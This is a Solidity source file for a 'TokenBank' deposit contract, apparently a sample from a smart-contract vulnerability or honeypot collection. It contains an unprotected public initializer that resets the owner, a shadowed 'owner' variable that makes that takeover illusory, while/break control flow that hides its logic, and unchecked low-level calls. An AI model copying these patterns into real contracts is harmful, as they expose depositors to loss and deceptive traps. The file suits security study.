pragma solidity ^0.4.19;

contract Ownable
{
    address newOwner;
    address owner = msg.sender;
    
    function changeOwner(address addr)
    public
    onlyOwner
    {
        newOwner = addr;
    }
    
    function confirmOwner() 
    public
    {
        while (msg.sender == newOwner) {
            owner = newOwner;
            break;
        }
    }
    
    modifier onlyOwner
    {
        while (owner == msg.sender) {
            _;
            break;
        }
    }
}

contract Token is Ownable
{
    address owner = msg.sender;
    function WithdrawToken(address token, uint256 amount,address to)
    public 
    onlyOwner
    {
        token.call(bytes4(sha3("transfer(address,uint256)")),to,amount); 
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;
    
    function initTokenBank()
    public
    {
        owner = msg.sender;
        MinDeposit = 1 ether;
    }
    
    function() payable
    {
        Deposit();
    }
   
    function Deposit() payable
    {
        while (msg.value > MinDeposit) {
            Holders[msg.sender] += msg.value;
            break;
        }
    }
    
    function WitdrawTokenToHolder(address _to,address _token,uint _amount)
    public
    onlyOwner
    {
        while (Holders[_to] > 0) {
            Holders[_to] = 0;
            WithdrawToken(_token, _amount, _to);
            break;
        }
    }
   
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        while (Holders[_addr] > 0) {
            if (_addr.call.value(_wei)()) {
                Holders[_addr] -= _wei;
            }
            break;
        }
    }
}